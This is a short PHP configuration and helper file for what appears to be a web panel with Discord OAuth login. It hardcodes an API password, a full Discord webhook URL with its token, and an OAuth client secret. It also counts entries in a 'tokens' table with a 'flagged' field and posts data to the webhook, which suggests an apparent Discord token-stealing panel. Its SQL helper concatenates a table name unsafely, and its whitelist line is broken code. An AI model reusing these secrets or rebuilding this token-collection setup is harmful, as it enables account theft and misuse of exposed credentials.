<?php
    require_once('database.php');

    // 
    $api_password = "JamesKitt112!";
    $webhook = "https://discord.com/api/webhooks/1010005553419911229/O8kajmEvlWA9D46mhBHhlT0h8oDjaT4tlZ4uauXo76KqKOh3WkVMddui53f0TjmOdtcN";

    // For Authentification System (Require)
    $OAUTH2_CLIENT_ID = '1010006806975746118';
    $OAUTH2_CLIENT_SECRET = 'zQmu087G6ksdzT0GAsq-qMkClvmVNzsF';
    $RedirectUrl = 'battle-scarred-flak.000webhostapp.com';
    $WhitelistIds = array("WL FOR YOUR IDS"983997013450428447,"...", "..");

    function CheckLogin(){
        if(isset($_SESSION['access_token'])) { return true; }
        else { return false; }
    }

    function GetCount($table) {
        global $bdd;
        $req = $bdd->prepare('SELECT * FROM ' . htmlspecialchars($table));
        $req->execute();
        return $req->rowCount();
    }

    function GetFlagedCount() {
        global $bdd;
        $req = $bdd->prepare('SELECT * FROM tokens WHERE isflaged = 1');
        $req->execute();
        return $req->rowCount();
    }

    function SendToWebhook($webhook, $data) {
        $ch = curl_init($webhook);
        curl_setopt_array($ch, array(
            CURLOPT_HTTPHEADER => array(
                "Content-Type: application/json"
            ),
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_RETURNTRANSFER => true
        ));

        curl_exec($ch);
        curl_close($ch);
    }
?>
